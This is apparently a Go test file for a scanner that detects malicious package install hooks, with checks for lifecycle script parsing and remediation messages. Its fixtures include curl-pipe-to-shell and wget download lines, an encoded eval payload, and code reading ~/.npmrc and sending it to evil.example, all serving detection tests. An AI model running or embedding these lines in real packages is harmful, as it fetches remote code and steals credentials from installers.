package installhook_test

import (
	"strings"
	"testing"

	"github.com/omni-line/omni-audit/internal/installhook"
)

func kinds(hits []installhook.Hit) map[string]int {
	out := map[string]int{}
	for _, h := range hits {
		out[h.Kind]++
	}
	return out
}

func TestScanFileShellAndDecode(t *testing.T) {
	py := []byte("import os\nos.system('curl http://evil.example | sh')\n")
	got := kinds(installhook.ScanFile("setup.py", py))
	if got[installhook.KindShell] != 1 || got[installhook.KindDecode] != 0 {
		t.Fatalf("setup.py hits: %+v", got)
	}

	benign := []byte("import subprocess\nsubprocess.check_call(['gcc', 'mod.c'])\n")
	if hits := installhook.ScanFile("setup.py", benign); len(hits) != 0 {
		t.Fatalf("compiler setup.py flagged: %+v", hits)
	}

	js := []byte("const {execSync} = require('child_process')\nexecSync('wget http://evil.example/a')\n")
	got = kinds(installhook.ScanFile("install.js", js))
	if got[installhook.KindShell] != 1 {
		t.Fatalf("install.js hits: %+v", got)
	}

	dec := []byte("eval(Buffer.from('aaa', 'base64').toString())\n")
	got = kinds(installhook.ScanFile("payload.js", dec))
	if got[installhook.KindDecode] != 1 || got[installhook.KindShell] != 0 {
		t.Fatalf("decode hits: %+v", got)
	}
}

func TestScanFileCredentialNeedsNetwork(t *testing.T) {
	both := []byte("const fs = require('fs')\nconst t = fs.readFileSync(process.env.HOME + '/.npmrc', 'utf8')\nfetch('https://evil.example/' + t)\n")
	got := kinds(installhook.ScanFile("install.js", both))
	if got[installhook.KindCredential] != 1 {
		t.Fatalf("credential hits: %+v", got)
	}

	// process.env plus a request is how legitimate installers read config.
	env := []byte("const token = process.env.NPM_CONFIG_TOKEN\nfetch('https://registry.example/' + token)\n")
	if hits := installhook.ScanFile("install.js", env); len(hits) != 0 {
		t.Fatalf("env config flagged: %+v", hits)
	}

	// A homepage that mentions the curl project is not a downloader.
	home := []byte("execSync('node scripts/build.js')\n// see https://curl.se/docs\n")
	if hits := installhook.ScanFile("install.js", home); len(hits) != 0 {
		t.Fatalf("curl.se flagged: %+v", hits)
	}
}

func TestScriptModeFlagsPipe(t *testing.T) {
	hits := installhook.ScanScript("base64 -d payload | sh")
	got := kinds(hits)
	if got[installhook.KindShell] != 1 {
		t.Fatalf("pipe hits: %+v", hits)
	}
	if hits[0].Message == "" || strings.Contains(hits[0].Message, "payload") {
		t.Fatalf("message should describe the pattern, not quote it: %+v", hits)
	}
}

func TestPthAndBinding(t *testing.T) {
	if hits := installhook.ScanFile("evil.pth", []byte("import os; os.system('curl http://evil.example')\n")); kinds(hits)[installhook.KindShell] != 1 {
		t.Fatalf("pth: %+v", hits)
	}
	if hits := installhook.ScanFile("numpy.pth", []byte("import numpy\n")); len(hits) != 0 {
		t.Fatalf("benign pth: %+v", hits)
	}
	gyp := []byte(`{"targets":[{"actions":[{"action": ["curl", "http://evil.example"]}]}]}`)
	if kinds(installhook.ScanFile("binding.gyp", gyp))[installhook.KindShell] != 1 {
		t.Fatal("binding.gyp should flag curl")
	}
}

func TestLongFileUsesWindow(t *testing.T) {
	var b strings.Builder
	b.WriteString("const {execSync} = require('child_process')\n")
	for i := 0; i < 50; i++ {
		b.WriteString("const x" + strings.Repeat("y", 3) + " = 1\n")
	}
	b.WriteString("const cmd = 'curl http://evil.example'\n")
	// The exec API and the shell token are more than the window apart.
	if hits := installhook.ScanFile("install.js", []byte(b.String())); len(hits) != 0 {
		t.Fatalf("distant pair should not combine: %+v", hits)
	}

	var near strings.Builder
	near.WriteString("const {execSync} = require('child_process')\n")
	for i := 0; i < 50; i++ {
		near.WriteString("const n = 1\n")
	}
	near.WriteString("execSync('curl http://evil.example')\n")
	if kinds(installhook.ScanFile("install.js", []byte(near.String())))[installhook.KindShell] != 1 {
		t.Fatal("same-line pair in a long file should flag")
	}
}

func TestParsePackageLifecycle(t *testing.T) {
	raw := []byte(`{
  "name": "@acme/widget",
  "version": "1.2.3",
  "scripts": {
    "test": "curl http://example.test",
    "postinstall": "node ./scripts/install.js && node -e \"void 0\"",
    "prepare": "node ../../outside.js"
  }
}`)
	pkg, err := installhook.ParsePackage(raw)
	if err != nil {
		t.Fatal(err)
	}
	if pkg.Name != "@acme/widget" || pkg.Version != "1.2.3" {
		t.Fatalf("pkg: %+v", pkg)
	}
	if len(pkg.Scripts) != 2 {
		t.Fatalf("scripts: %+v", pkg.Scripts)
	}
	post := pkg.Scripts[0]
	if post.Name != "postinstall" || post.Line == 0 {
		t.Fatalf("postinstall: %+v", post)
	}
	if len(post.Files) != 1 || post.Files[0] != "scripts/install.js" {
		t.Fatalf("files: %+v", post.Files)
	}
	hits := installhook.ScanScript(post.Body)
	if len(hits) != 0 {
		t.Fatalf("node install.js is not itself a payload: %+v", hits)
	}
	if files := pkg.Scripts[1].Files; len(files) != 0 {
		t.Fatalf("path escape should not be followed: %+v", files)
	}

	curl := installhook.ScanScript("curl http://evil.example | sh")
	if kinds(curl)[installhook.KindShell] != 1 {
		t.Fatalf("script curl: %+v", curl)
	}
}

func TestParsePackageRejectsNonJSON(t *testing.T) {
	if _, err := installhook.ParsePackage([]byte("not json")); err == nil {
		t.Fatal("expected error")
	}
}

func TestRemediationDiffersForDrift(t *testing.T) {
	script := installhook.Remediation(installhook.KindShell)
	drift := installhook.Remediation(installhook.KindVersionMismatch)
	if script == "" || drift == "" || script == drift {
		t.Fatalf("script=%q drift=%q", script, drift)
	}
	if installhook.Remediation("nope") != "" || installhook.Message("nope") != "" {
		t.Fatal("unknown kind should have no copy")
	}
}

func TestMismatchMessageListsLockedVersions(t *testing.T) {
	msg := installhook.MismatchMessage("9.9.9", map[string]struct{}{"4.17.21": {}, "4.17.20": {}})
	if !strings.Contains(msg, "9.9.9") || !strings.Contains(msg, "4.17.20") || !strings.Contains(msg, "4.17.21") {
		t.Fatalf("message: %s", msg)
	}
	if strings.Contains(installhook.Message(installhook.KindNotInLockfile), "9.9.9") {
		t.Fatal("generic message should not invent a version")
	}
}
